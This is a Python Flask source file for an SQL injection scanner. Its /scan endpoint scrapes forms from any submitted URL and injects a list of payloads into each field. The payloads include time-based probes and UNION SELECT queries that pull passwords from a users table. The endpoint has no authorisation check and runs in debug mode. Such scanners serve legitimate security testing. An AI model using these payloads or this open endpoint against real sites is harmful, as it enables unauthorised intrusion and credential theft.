from flask import Flask, request, jsonify
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

app = Flask(__name__)
def get_forms(url):
    try:
        response = requests.get(url)
        response.raise_for_status()  # Check for request errors
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except Exception as e:
        print(f"Error fetching forms: {e}")
        return []

def form_details(form):
    details = {}
    try:
        action = form.attrs.get("action")
        method = form.attrs.get("method", "get").lower()
        inputs = []
        for input_tag in form.find_all("input"):
            input_name = input_tag.attrs.get("name")
            input_type = input_tag.attrs.get("type", "text")
            input_value = input_tag.attrs.get("value", "")
            inputs.append({"name": input_name, "type": input_type, "value": input_value})
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
    except Exception as e:
        print(f"Error extracting form details: {e}")
    return details

def vulnerable(response):
    errors = [
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated"
    ]
    for error in errors:
        if error in response.text.lower():
            return True
    return False

@app.route('/scan', methods=['POST'])
def sql_injection_scan():
    try:
        url = request.json['url']
        s = requests.Session()
        forms = get_forms(url)
        results = []

        payloads = [
            "' OR 1=1 --",
            "' OR 1=0 --",
            "' OR 'a'='a' --",
            "' OR 'a'='b' --",
            "' OR 1=1 and 'a'='a' --",
            "' OR 1=0 and 'a'='b' --",
            "' OR sleep(5) --",
            "' OR benchmark(99999999,md5('test')) --",
            "' UNION SELECT * FROM users --",
            "' UNION SELECT NULL,NULL,password FROM users --",
            "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin') --",
            "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password='' OR 1=1) --",
            "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password=MD5('test')) --",
            "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password=SHA1('test')) --",
            "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password=CRYPT('test')) --",
            "') OR 1=1 --",
            "') AND 1=1 --",
            "') AND 'a'='a' --",
            "') AND 'a'='b' --",
            "') AND 1=1 and 'a'='a' --",
            "') AND 1=0 and 'a'='b' --",
            "') OR sleep(5) --",
            "') OR benchmark(99999999,md5('test')) --",
            "') UNION SELECT * FROM users --",
            "') UNION SELECT NULL,NULL,password FROM users --",
            "') AND 1=(SELECT COUNT(*) FROM users WHERE username='admin') --",
            "') AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password='' OR 1=1) --",
            "') AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password=MD5('test')) --",
            "') AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password=SHA1('test')) --",
            "') AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password=CRYPT('test')) --",
            "'; wait_for delay '0:0:10'--"
        ]

        for form in forms:
            details = form_details(form)
            form_action = details.get("action")
            if form_action:
                if form_action.startswith('/'):
                    action_url = urljoin(url, form_action)
                else:
                    action_url = form_action
            else:
                action_url = url

            for payload in payloads:
                data = {}
                for input_tag in details["inputs"]:
                    if input_tag["type"] == "hidden" or input_tag["value"]:
                        data[input_tag['name']] = input_tag["value"] + payload
                    elif input_tag["type"] != "submit":
                        data[input_tag['name']] = f"test{payload}"

                if details["method"] == "post":
                    res = s.post(action_url, data=data)
                elif details["method"] == "get":
                    res = s.get(action_url, params=data)

                if vulnerable(res):
                    results.append({
                        "form": details,
                        "payload": payload,
                        "vulnerable": True
                    })
                    break
                else:
                    results.append({
                        "form": details,
                        "payload": payload,
                        "vulnerable": False
                    })

        return jsonify(results)

    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(debug=True)
